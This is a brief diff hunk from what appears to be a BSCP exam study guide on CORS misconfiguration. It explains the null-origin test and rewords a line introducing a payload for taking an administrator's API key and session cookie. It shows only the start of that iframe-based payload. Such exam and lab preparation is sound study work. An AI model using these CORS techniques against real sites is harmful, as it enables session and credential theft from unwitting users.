@@ -1983,7 +1983,7 @@ Origin: http://subdomain.TARGET.NET
 
 >Identify the CORS insecure configuration by checking the AJAX response if it contains the `Access-Control-Allow-Credentials`, then add header `Origin: null`. If the `null` origin is reflected in the `Access-Control-Allow-Origin` header it is vulnerable.  
 
->Payload that may work in BSCP exam on getting the administrator account API and session cookie. Host on exploit server.  
+>Payload that may work in BSCP exam to obtain the administrator account API and session cookie data. Host on exploit server.  
 
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
